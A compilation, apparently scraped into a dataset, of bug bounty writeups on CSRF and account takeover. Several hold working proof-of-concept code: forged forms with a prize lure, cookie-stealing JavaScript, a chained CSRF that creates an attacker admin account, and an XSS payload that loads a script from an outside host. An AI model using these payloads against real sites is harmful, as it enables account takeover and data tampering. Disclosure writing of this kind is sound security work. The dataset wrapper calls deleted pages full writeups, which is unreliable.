name=”uname” value=” hack@gmail.com ” /> <input type=”hidden” name=”issendmsg” value=”1\" /> <input type=”hidden” name=”display” value=”” /> <input type=”hidden” name=”sendtype” value=”update” /> <input type=”hidden” name=”firstname” value=”accountinfo” /> <input type=”hidden” name=”lastname” value=”HACKED” /> <input type=”hidden” name=”country” value=”US” /> <input type=”hidden” name=”reglang” value=”en&#95;US” /> <input type=”hidden” name=”postcode” value=”1337\" /> <input type=”submit” value=”Submit request” /> </form> </div> </body> <script> document.querySelector(“#btn”).onclick = function() { var token = document.querySelector(“input”).value var form = document.querySelector(“form”) token = JSON.parse(token) var mapInput = document.createElement(“input”); mapInput.type = “hidden”; mapInput.name = “auth_token”; mapInput.value = token.Value; form.appendChild(mapInput) form.action = ` https://redacted.com/editInfo` form.submit(); alert(“Congratulation! You have won $100”) } </script> </html> Press enter or click to view image in full size So when the victim pastes the api response in the field & clicks on CLICK TO WIN. The js code will append the input field in form with the CSRF token that i got from victim & made request to update the account details & Boom it worked. I hope you like it ./LOGOUT JavaScript -- -- Written by Saad Ahmed 636 followers · 1 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@shub66452/account-takeover-using-csrf-json-based-a0e6efd1bffc", "title": "Exploiting a Chain of Vulnerabilities for Account Takeover | by shub rathore | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@shub66452/account-takeover-using-csrf-json-based-a0e6efd1bffc. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting a Chain of Vulnerabilities for Account Takeover | by shub rathore | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Exploiting a Chain of Vulnerabilities for Account Takeover shub rathore 4 min read · Jul 4, 2019 -- 1 Listen Share Hey All, I’m sil3nt_4unt3r, a bug hunter on HackerOne and Bugcrowd.This blog is my first foray into the world of writing, INFO:- Admin = full privileges 2. H-User = Some Privileges 3. L-User = Low Privileges 4. Guest = Very-Low Privileges 5. Program-Name = Redacted.com 6. The application is using json in the backend to transfer the data I recently participated in a private Bugcrowd program with four user roles: Admin, H-User, L-User, and Guest. As part of my testing approach, I started by logging in with the admin account to explore the application’s functionalities. During this exploration, I noticed that any changes made to site information triggered API requests to the server, following a pattern like https://redacted.com/api/* . While testing account settings, specifically the location field, I decided to delve deeper through fuzzing techniques. Interestingly, I discovered that the API endpoint lacked additional CSRF (Cross-Site Request Forgery) protection. While the API key served as a basic protection layer, it wasn't enough to fully secure the endpoint. Press enter or click to view image in full size API request To exploit the CSRF vulnerability in the API endpoint, I required an any user API key. However, I identified an interesting functionality: a shared file and chat endpoint ( https://redacted.com/office/[unique-Key]/story ). Uploading a file and sharing it with everyone offered a potential path forward. Here’s how I executed the attack: Shared File with L-User: I uploaded a file and shared it with everyone using the aforementioned endpoint. Switched Account: I then switched my login to an L-user account. Triggered Notification: Upon logging in as the L-user, a notification appeared in the sidebar indicating a document shared by the admin. Opening the notification likely triggered an API request. Intercepted Traffic with Burp: Anticipating a potential data leak in API requests related to the notification, I started Burp Suite listeners and refreshed the page. Filtered Requests: I set a Burp filter for requests containing “story*” to narrow down the relevant traffic. Identified Vulnerable Endpoint: After analyzing captured requests, I identified a vulnerable endpoint: /API/officename/[id]/storyPost/[L-user-office-id]/comments . This endpoint appeared to leak data belonging to the admin and potentially other users. Further Fuzzing: Further exploration through fuzzing techniques revealed another endpoint leaking sensitive information, including user IDs, usernames, emails, API keys, office keys, and potentially more. Press enter or click to view image in full size Leak other user info With the identified vulnerability, I proceeded to craft a CSRF exploit. JSON-based CSRF attacks can be achieved through two primary methods: Flash and XMLHttpRequest (XHR). Since the server relied on PUT requests for data updates, the Flash method wasn’t applicable. Focusing on XHR, two key factors contribute to its successful exploitation: Cross-Origin Resource Sharing (CORS) misconfiguration and the presence of XSS. Fortunately, I had already discovered a stored XSS vulnerability within the program. Leveraging the XSS, I constructed a CSRF exploit file. This file, when sent to the admin as a link, could potentially trigger the identified vulnerability upon clicking. The impact of this action could have resulted in unauthorized modification of the admin’s user data, including email, password, and username. Press enter or click to view image in full size Press enter or click to view image in full size Press enter or click to view image in full size Impact:- The identified CSRF vulnerability held significant implications. By exploiting this vulnerability, it was possible to gain the ability to modify various user data, including passwords, usernames, and email addresses. This impact extended not only to the admin account but potentially to all users across the main domain and its subdomains. BugBountyTips:- My experience highlights the importance of fuzzing group communication functionalities, such as file sharing and chat endpoints. Fuzzing these areas can potentially uncover leaks of sensitive data, like user tokens, usernames, or API keys. In my case, fuzzing the /api/story* endpoint on a specific platform revealed a significant vulnerability. This endpoint facilitated group chat, note sharing, and file sharing among various user roles (admin, H-user, L-user, and guest). Responsible Disclosure and Collaboration I’d like to express my appreciation to the company’s co-founder for their exceptional approach. When the platform itself wasn’t responsive to my initial inquiries, the co-founder directly contacted me to clarify the situation. This collaborative approach is crucial for responsible vulnerability disclosure and improving platform security. Report submitted 9 May 2019 Report Trigger 16 May 2019 Rewarded bounty xxxx$ on 27 May 2019 Bug Resolved 29 May 2019 -- -- 1 Written by shub rathore 88 followers · 1 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441", "title": "CORS To CSRF Attack. This writeup is about the CORS… | by Osama Avvan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCORS To CSRF Attack. This writeup is about the CORS… | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in CORS To CSRF Attack Osama Avvan 2 min read · Jun 27, 2019 -- Listen Share This writeup is about the CORS Misconfiguration by which I was able to perform a CSRF attack to change other users account Info. The target let’s just say it was named redact.com was sending a PUT request to the server for updating User Information like Address, Name, etc. An Origin Header was also sent in the request Origin: redact.com which was reflected in the Response and the Access-Control-Allow-Credentials was set to True. Which means that cookies can be sent along with the request. I tried to change the Origin Header value to evil.com and then redact.com.evil.com but both were rejected. But sending the Origin : evil . redact.com worked which means that sub domain of redact.com can send requests to its API. Press enter or click to view image in full size Now I needed an XSS on one of its subdomains to send the PUT request to the Server, luckily I got an XSS on help.redact.com. But it wasn’t enough an enctyptedMembershipNumer param was sent along with the PUT request to identify the user. After looking into the Cookies of redact.com I found that the enctyptedMembershipNumer was saved in a cookie with a name prop_29 which was scoped to the . redact.com the dot, in the beginning , means that this cookie can be accessed from its subdomains. So to extract that Cookie I wrote a JS code. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } Now the complete code to get the enctyptedMembershipNumer and to send the PUT request. function getCookie(name) { var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’)); if (match) return match[2]; } cook = getCookie(“prop_29”) data = {“member”:{“mailingAddress”:{“addressLineOne”:”Account Hacked”,”city”:”NEW Port”,”stateOrProvinceCode”:”NY”,”postalCode”:”20001\",”email”:” hacked@gmail.com ”,”countryCode”:”US”}}} fetch(` https://www.redact.com/api/node/vivaldi/v1/account/primary-contact?encryptedMembershipNumber=${cook}` , {method: “PUT”, credentails: “include”, body: JSON.stringify(data)}) I created a JS file and uploaded the code on my server to use in the XSS payload. Final Payload: https://help.redact.com/app/answers/list?searchTerm=<svg onload=script=document[‘createElement’](‘script’);script[‘src’]=’https:&#47;&#47;osamaavvan&#46;000webhostapp&#46;com&#47;a&#46;js’;document[‘head’][‘appendChild’](script);> The . and // were removed from the Payload by the XSS filter so I converted them to their respective HTML entities. Thank You for Reading. 📝 Read this story later in Journal . 👩‍💻 Wake up every Sunday morning to the week’s most noteworthy stories in Tech waiting in your inbox. Read the Noteworthy in Tech newsletter . JavaScript Bug Bounty Bugcrowd Security Researchers -- -- Written by Osama Avvan 1.1K followers · 0 following Security Researcher, ❤️ To Code. Find me at: https://twitter.com/osamaavvan No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.darabi.me/2019/12/instagram-delete-media-csrf.html", "title": "Media deletion CSRF vulnerability on Instagram\n        | \n        Dynamic World", "friendly_explanation": "This is a bug bounty writeup from https://blog.darabi.me/2019/12/instagram-delete-media-csrf.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMedia deletion CSRF vulnerability on Instagram | Dynamic World Dynamic World Bug Bounty, Facebook, Writeup, Vulnerability Home About Dynamic World Dynamic World Home About Home vulnerability Media deletion CSRF vulnerability on Instagram Monday, December 9, 2019 Media deletion CSRF vulnerability on Instagram bounty bug bugbounty critical CSRF exploit facebook exploit instagram privacy vulnerability Pouya 10:27 PM No comments Media deletion CSRF vulnerability on Instagram I noticed a copyright section has been added to instagram. whenever a user violated another person copyright, a notification will be shown to delete or request an appeal for the media. After uploading a video containing a music I faced with copyright It was interesting to me, so I started digging into it. It was possible to delete media by a GET request Vulnerable Endpoint: https://www.instagram.com/media/{MEDIA_ID}/copyright/dismiss_am/ The MEDIA_ID is a {story_id or post_id} that will be deleted Opening the malicious link within the both Instagram app or web cause media deletion in the victim's account. Android POC: Remove story CSRF in android Web POC: Remove post CSRF in web Impact: User could be tricked into deleting content they had posted on Instagram. Ti meline: January 29, 2019 – Report Sent January 29, 2019 – Triaged January 30, 2019 - Permanent fix February 14, 2019 $3,000 Bounty awarded Older Post Newer Post No comments : Post a Comment Subscribe to: Post Comments ( Atom ) Popular Posts How I bypassed Facebook CSRF Protection I discovered a critical vulnerability in Facebook that allowed an attacker to bypasses Facebook CSRF protection! more informa... Image removal vulnerability in Facebook polling feature Delete any Image on Facebook When I was checking out facebook's new features, I noticed that polling feature were adde... How I bypassed Facebook CSRF once again! I found a vulnerability in Facebook that allowed me to create arbitrary form in Facebook that send a POST request with CSRF token... Create post on any Facebook page Create an invisible post on any Facebook page You may know that you can create many types of posts on your Facebook feed. one of them is c... Bypass ad account roles vulnerability 2015 I discovered a vulnerability in Facebook that allowed a normal user in ad account to get unauthorized admin access in that ad a... Another image removal vulnerability on Facebook Delete any Image on Facebook using Series Feature I noticed the Series Feature was added to Facebook Creator Studio therefor I start diggin... Media deletion CSRF vulnerability on Instagram Media deletion CSRF vulnerability on Instagram I noticed a copyright section has been added to instagram. whenever a user violated a... Category 2015 2016 2017 2020 ads bounty bug bugbounty business bypass critical CSRF exploit facebook facebook exploit hack instagram privacy roles vulnerability Blog Archive ► 2021 ( 1 ) ► January ( 1 ) ► 2020 ( 1 ) ► June ( 1 ) ▼ 2019 ( 1 ) ▼ December ( 1 ) Media deletion CSRF vulnerability on Instagram ► 2017 ( 1 ) ► November ( 1 ) ► 2016 ( 1 ) ► May ( 1 ) ► 2015 ( 2 ) ► April ( 1 ) ► March ( 1 ) © 2024 Copyright Dynamic World Powered by Blogger Template Design by fostrap"}
{"source_url": "https://medium.com/@nishantrustlingup/my-first-csrf-to-account-takeover-worth-750-1332641d4304", "title": "My First CSRF to Account Takeover worth $750 | by Nishant Saurav | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nishantrustlingup/my-first-csrf-to-account-takeover-worth-750-1332641d4304. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy First CSRF to Account Takeover worth $750 | by Nishant Saurav | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in My First CSRF to Account Takeover worth $750 Nishant Saurav 3 min read · May 30, 2019 -- Listen Share Before I start. I want to take a moment to all who helped me learn Web Application Security and Bug Bounty Hunting! :) Hello, Guys, the Program was a private Invite and I am still working with this program. So, for the sake of the privacy of the program, let us call it “example.com” in this writeup. I got this invite around 6 months back. The Website has the functionality of making an order of using public transport ( e.g. Purchasing tickets, passes, storing user information like card details, home address, work address, etc.). To test the CSRF, I created two accounts. One for the attacker and another for the Victim. Let us call it as “Attacker@gmail.com” and “victim@gmail.com”. Press enter or click to view image in full size “attacker@gmail.com” Now, I filled in the details for both the account. And then I started making some changes into it like adding work address and making an order from the Attacker’s account. I Put the Burp Intercept ON and clicked on the “save” button. Here is the burp request which I captured. Press enter or click to view image in full size Now, I generated the CSRF poc using the burp suite and saved it as an html page. And send it to the victim account who was logged in using the Chrome browser. I opened the HTML page in the new tab of the Chrome browser and refreshed the page where I was already logged in. And Boom….. The work address of the victim was changed to “bla….bla…bla” and a new order was made on behalf of the victim. As the card details were not added in both the accounts, the order was eligible for on-spot payment. Now…I thought that if the attacker is able to make order on behlaf of the victim then he could probably also takeover the victim’s account. I said to let’s check it out.. :) Now to take over the account, I went to the setting page of the attacker's account first and then gave a temporary email address from the temp-mail.ord and captured the request in Burp without any changes by re-saving the same information. Then I saved the CSRF POC and sent it to the victim. As soon as I opened the page in the victim’s browser the email of the account changed from “victim@gmail.com” to the temp-mail one. Then I was like…. Finally, I made a nice report and submitted it to the program. The Company took almost 3 months to respond and closed the report by paying $750 in the next 1 month. Although it was less for the account takeover ;). I thought of putting this writeup a million times but I am Lazy! Lol! :P Thanks for being patient and reading this writeup. This is my first ever writeup. I hope you all like it and let me know if you want me to put anything else in my next writeup or any mistakes in this writeup. You can always find me on: Twitter: https://twitter.com/inishantsinha LinkedIn: https://www.linkedin.com/in/nishantsaurav/ :) :) Bug Bounty Csrf Account Takeover Web Application Security Burpsuite -- -- Written by Nishant Saurav 213 followers · 35 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/a-bugz-life/4x-csrfs-chained-for-company-account-takeover-f9fada416986", "title": "4x CSRFs Chained For Company Account Takeover | by A Bug’z Life | A Bug’z Life | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/a-bugz-life/4x-csrfs-chained-for-company-account-takeover-f9fada416986. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n4x CSRFs Chained For Company Account Takeover | by A Bug’z Life | A Bug’z Life | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in A Bug’z Life · Our experiences navigating through infosec engineering & stuff 4x CSRFs Chained For Company Account Takeover A Bug’z Life 5 min read · May 8, 2019 -- 3 Listen Share Press enter or click to view image in full size Critical Company Account Takeover CSRF We’ve been spending some time on a new private program on HackerOne , focusing on an asset that allows businesses to have company accounts, and invite different users to their company. They handle some fairly sensitive personal information on behalf of their users. We found a couple medium severity bugs the first 2 days, noted some areas to come back to, and noticed some other areas that could be easily escalated and exploited when finding a XSS. We spent a fair bit of that time trying to find a XSS because we knew as soon as we did, a user account takeover could be performed by changing the user’s email as there was no validation or verification process such as verifying the change from the old email address or requiring the user to enter a password. Unfortunately, XSS’ have been very hard to find on this application as pretty much all user input goes through a filter that blocks any special character. On the 2nd night hunting on the program (Friday), we discovered the application has some functionality to import users from CSV. It’s an interesting process where there are several steps required in order to import the users from the CSV file. We tried to include special characters through the CSV upload, but they were also filtered unfortunately. Then after trying the filename itself: <img src=x onerror=alert(document.domain)>.csv an alert box popped! We could now perform a user account takeover using this XSS. After continuing to test this, we quickly realized that this only triggers the moment you upload the file, even though the filename is persisted. There is no encoding performed at the time of file upload, but encoding is done any point after the initial upload. So this basically means that we can only execute this as a self-XSS, which is out of scope from the program. After trying a bunch of different payloads to bypass the encoding done by the application, there was no luck. The next course of action is to keep this in our back pocket and hope the encoding can be bypassed at some point, or execute it through some other way. Lucky for us, the endpoint does not have CSRF protection. Well this should be easy enough, just craft a CSRF request to trigger the self-XSS. <html> <body> <script>history.pushState('', '', '/')</script> <script> var uploadId = UPDATE_THIS_WITH_ID; function submitRequest() { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", `https://company.com/users/uploadFile?uploadId=${uploadId}`, true ); xhr.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\"); xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data; boundary=---------------------------1566359571913061724703232384\"); xhr.withCredentials = true ; var body = \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"uploadedFile\\\"; filename=\\\"<img src=x onerror=alert(document.domain)>.csv\\\"\\r\\n\" + \"Content-Type: text/csv\\r\\n\" + \"\\r\\n\" + \"Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\\r\\n\" + \"H1 Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"rosterType\\\"\\r\\n\" + \"\\r\\n\" + \"staff\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"importMethod\\\"\\r\\n\" + \"\\r\\n\" + \"updateAdd\\r\\n\" + \"-----------------------------1566359571913061724703232384--\\r\\n\"; var aBody = new Uint8Array(body.length); for ( var i = 0; i < aBody.length; i ++ ) aBody[i] = body.charCodeAt(i); xhr.send( new Blob([aBody])); </script> <form action=\"#\"> <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /> </form> </body> </html> The above PoC worked as a CSRF, but there wasn’t an endpoint the user could be sent to after submitting the POST request that would trigger the XSS. All the target endpoints already had the filename encoded. After trying a few different redirects and other techniques, nothing seemed to be working so we dropped this and decided to take a break. Fast forward to Sunday night (2 days after discovering the self-XSS), watching T.V., and some random inspiration hits (which happens surprisingly often since starting bug hunting)! Why don’t we forget about this red herring of a self-XSS and try to exploit this endpoint with a CSRF. We were blinded by the XSS possibility to realize this 😄. The file upload process contained the following aspects, all of which are required to push the change from file upload to users being added: Upload the file ( POST-1 ) Fix any mistakes in the upload ( GET-1 ) Verify changes in the upload & submit for preview/verification ( GET-2 ) Verify changes from preview, and submit the upload ( GET-3 ) We already knew the first POST request was vulnerable to CSRF, and went through the remaining 3 GET requests and were lucky to see that these were also vulnerable to CSRF. This was a bit tricky, because some of the steps were not clear on how they could be executed, and there was 1 missing step from the above steps that would be identified later. After spending some time crafting a PoC for the the above 4 steps with no idea why it didn’t work, it seemed the application required the upload job to be viewed before it could be fixed. So it required us to insert a step between 1 and 2 which was a request to view the job. Also, CORS was adequately configured on the endpoint, so we could not get any response data when calling the endpoints, which would’ve been very helpful in order to get the current status of each of the steps (as each take a couple seconds-minutes depending on how much data was uploaded, internet speed, server load, etc.). After some testing on the average time it takes for each request to finish processing, we could then use Javascript’s setTimeout to stagger each of the 4 requests to ensure we can chain all of these CSRFs in one go. The final PoC code looked like: <html> <body> <script>history.pushState('', '', '/')</script> <script> var uploadId = UPDATE_THIS_WITH_ID; function xhrRequest(url) { var xhr = new XMLHttpRequest(); xhr.open('GET', url); xhr.withCredentials = true; xhr.send(null); } function submitRequest() { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", `https://company.com/users/uploadFile?uploadId=${uploadId}`, true ); xhr.setRequestHeader(\"Accept\", \"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\"); xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data; boundary=---------------------------1566359571913061724703232384\"); xhr.withCredentials = true ; var body = \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"uploadedFile\\\"; filename=\\\"neema.csv\\\"\\r\\n\" + \"Content-Type: text/csv\\r\\n\" + \"\\r\\n\" + \"Company,User ID,LAST NAME,FIRST NAME,Access,Type,Email\\r\\n\" + \"Company,999,Takeover,Account,System Admin,Administrator,neemaPoC@gmail.com\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"rosterType\\\"\\r\\n\" + \"\\r\\n\" + \"staff\\r\\n\" + \"-----------------------------1566359571913061724703232384\\r\\n\" + \"Content-Disposition: form-data; name=\\\"importMethod\\\"\\r\\n\" + \"\\r\\n\" + \"updateAdd\\r\\n\" + \"-----------------------------1566359571913061724703232384--\\r\\n\"; var aBody = new Uint8Array(body.length); for ( var i = 0; i < aBody.length; i ++ ) aBody[i] = body.charCodeAt(i); xhr.send( new Blob([aBody])); window.setTimeout( function () { window.open(`https://company.com/users/upload?uploadId=${uploadId}`); window.setTimeout( function () { xhrRequest(`https://company.com/users/fix?uploadId=${uploadId}`); window.setTimeout( function () { xhrRequest(`https://company.com/users/submitToPreview?uploadId=${uploadId}`); window.setTimeout( function () { xhrRequest(`https://company.com/users/submitImport?uploadId=${uploadId}`); }, 2000) }, 2000) }, 2000) }, 2000) } </script> <form action=\"#\"> <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /> </form> </body> </html> The above code sends the initial POST request, and then staggers each request after the initial upload by timing out for 2000 ms (2 seconds). We found this to be a safe estimate for uploading 1 user. When this page hosted by the attacker (assuming the victim is an admin) is visited, the CSRF attack is executed and the 4 vulnerable endpoints are exploited to create an administrator user for the attacker. The attacker receives an email with their username and password to login. Once logging in, an administrator can delete any other administrator, so the attacker can delete all the other admins in the company, and completely takeover the account. This gives the attacker full access to all data and functionality, simply by the victim visiting the attacker controlled page. After writing up this PoC, the report was finally sent over to the team who responded incredibly quickly with a triage and fix (well done to this team, they are very responsive and quick to act). Timeline: Report Submitted: Day 0 Report Triaged (Critical Severity): Day 1 $3,000 Bounty Rewarded: Day 2 Bug Fixed & Report Closed: Day 7 Bug Bounty Hacking Security Infosec Penetration Testing -- -- 3 Published in A Bug’z Life 1.3K followers · Last published Apr 15, 2020 Our experiences navigating through infosec engineering & stuff Written by A Bug’z Life 1.6K followers · 1 following Our blog for all things security and technology related. Everything from our journey along InfoSec career path, bug bounty write-ups and more interesting stuff. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@adeshkolte/lintern-ute-account-takeover-via-csrf-adesh-kolte-307f7065ee74", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@adeshkolte/lintern-ute-account-takeover-via-csrf-adesh-kolte-307f7065ee74. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@mr_hacker/csrf-bypass-using-cross-frame-scripting-c349d6f33eb6", "title": "CSRF BYPASS USING CROSS FRAME SCRIPTING | by ?Mr.Hacker | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@mr_hacker/csrf-bypass-using-cross-frame-scripting-c349d6f33eb6. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCSRF BYPASS USING CROSS FRAME SCRIPTING | by ?Mr.Hacker | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in ?Mr.Hacker 3 min read · Feb 10, 2019 -- 1 Listen Share Csrf Bypass Using Cross Frame Scripting Hello Everyone!! Mr.Hacker here, in this article I am going to show how I bypassed csrf using cross frame scripting in a public program on HackerOne. So directly cutting to the point, there is a module in the web application to send messages to users as shown below. Press enter or click to view image in full size Send Message Form Initially i tested for csrf vulnerability on this module but it was completely mitigated and there was a token in the post request which was validated by the server, hence csrf was not possible. But later i noticed that after generating csrf poc in burp and removing the csrf token and executing it, the server would respond back with the same form values and new csrf token set in the new message form as the response. So now if i click on “Post Message” then the request would be sent to the server with the form values already being set by the server and request would get successfully executed. Later i came up to chain cross frame scripting and csrf as the entire web application was vulnerable to cross frame scripting. Press enter or click to view image in full size CSRF File In Clickjacking Press enter or click to view image in full size Chaining CrossFrameScripting and CSRF Attack Scenario : The attacker will generate a valid csrf poc with burp with form values and removing csrf token. Now if we execute the csrf poc server will respond with all form values pre set in the response and also with a valid token, Hence an attacker will include the csrf file inside clickjacking file. So when the victim clicks on the malicious url sent by attacker, the clickjacking file will load the csrf file and inturn it would auto submit the form with the respective values and later server will send a response with the same form values set and also with the valid csrf token. Hence now the response is loaded using clickjacking and when the user clicks on Post Message it would generate a valid request and it will be executed successfully. Later i submitted this vulnerability and got a bounty reward, the reason behind the article was to understand that no vulnerability is low if we try to chain it with few other it can also give a high impact issues. Mostly people avoid submitting cross frame scripting or other low impact vulnerabilities as they are out of scope but if we can use it in a unique way then low hanging fruits can also give us a great impact with few other vulnerabilities. You can see the video Poc Here . That’s it, i hope you enjoyed this article and Happy Hacking!. Security Csrf Bypass -- -- 1 Written by ?Mr.Hacker 249 followers · 35 following Hacking Passion | Social Engineer | Osint Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@armaanpathan/brute-forcing-user-ids-via-csrf-to-delete-all-users-with-csrf-attack-216ccd4d832c", "title": "Brute Forcing User IDS via CSRF To Delete all Users with CSRF attack. | by Armaan Pathan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@armaanpathan/brute-forcing-user-ids-via-csrf-to-delete-all-users-with-csrf-attack-216ccd4d832c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBrute Forcing User IDS via CSRF To Delete all Users with CSRF attack. | by Armaan Pathan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Brute Forcing User IDS via CSRF To Delete all Users with CSRF attack. Armaan Pathan 2 min read · Mar 12, 2019 -- 1 Listen Share While testing an application, there was a module “Delete User” in which an admin can delete any user. Press enter or click to view image in full size If you notice in the request, there is no CSRF Token/Protection implemented into delete user request. This was very easy CSRF that an attacker can send the form to admin and can delete the user from an application. Simple CSRF PoC to Delete User Press enter or click to view image in full size But again if you notice that request contains the user id. My challenge was to figure out that if an application user ids at any endpoints but I found that there was no user ID leakage. As it was 5 digits numeric ID, It was easy to brute force, From the research I got the blog post in which an attacker has brute-forced the IDs with the help of clickjacking. Client-side CSRF Token Brute Forcing While playing around with some CSRF examples the idea of client-side CSRF token brute-forcing came into my head. I'd… pwndizzle.blogspot.in Now Challenge is that an application was using X-Frame Options Header so I was not able to load an application into the frame to brute force the IDS. I tried with XMLHttpRequest, But again an application was validating the ORIGIN so, in this case, XHR dint work for me. Then I tried by throwing requests into iframe target. In this case, I was not able to view the response as the response had X-Frame-Option Header which application was validating. But I was able to send the request So I made a CSRF Script which brute forces the USER IDS and deletes all the existing Users with CSRF from an application Press enter or click to view image in full size And When I sent this PoC to the victim (admin), I was able to delete all Existing users from an application. Press enter or click to view image in full size Thanks, guys for reading. Have a great day ahead. Security Hackerone Bug Bounty Bugcrowd Owasp -- -- 1 Written by Armaan Pathan 1.6K followers · 4 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://rafiem.github.io/bugbounty/tokopedia/site-wide-csrf-graphql/", "title": "404 - Not found", "friendly_explanation": "This is a bug bounty writeup from https://rafiem.github.io/bugbounty/tokopedia/site-wide-csrf-graphql/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404 - Not found 404 Oops! Page not found This page doesn't exist or was removed! We suggest you go back home. Take me home"}
{"source_url": "https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276", "title": "A very useful technique to bypass the CSRF protection for fun and profit. | by Yeasir Arafat | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nA very useful technique to bypass the CSRF protection for fun and profit. | by Yeasir Arafat | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in A very useful technique to bypass the CSRF protection for fun and profit. Yeasir Arafat 2 min read · Oct 26, 2018 -- 5 Listen Share Hi folks, It’s always a pleasure to share some good stuff with you guys. The heading of the story may give you an idea that today I’m going to share something about CSRF protection bypass. What is CSRF protection? In short, CSRF(Cross-Site Request Forgery) attacks specifically target state-changing requests on a web browser. To prevent this attacks developer adds an ANTI-CSRF token in the request in several ways. For more, you can see it from here, ` Article-1` ` Article-2` It was a private program that I was testing and because of privacy, I can not disclose the name. Let’s assume the site name is vulnhost.com. It was protected to CSRF until I found the bypass. The vulnhost.com verifying its request under a POST material request. Vulnhost.com actually implemented the _csrf token to the POST request and validate it on the server side. The state changing POST request looked like this, POST /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact HTTP/1.1 Host: en.vulnhost.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 Accept: application/xml, text/xml, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://en.vulnhost.com/mycenter/settings/account.html Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Wicket-Ajax: true Migration-Wicket: 6 Wicket-Ajax-BaseURL: mycenter/settings/account.html Wicket-FocusedElementId: id49 X-Requested-With: XMLHttpRequest Content-Length: 246 Cookie: ....... Connection: close _csrf=725a7f90-192f-4b94-8fc9-6320ace14fef&id48_hf_0=&gender=radio8&firstName=xx&lastName=YY&saveContact=1 Here, the _csrf= parameter generates the random token to verify the request. If I change/remove the _csrf token to the GET request vulnhost.com do not validate it on the server side. For the bypass I change the request method POST to GET and remove the 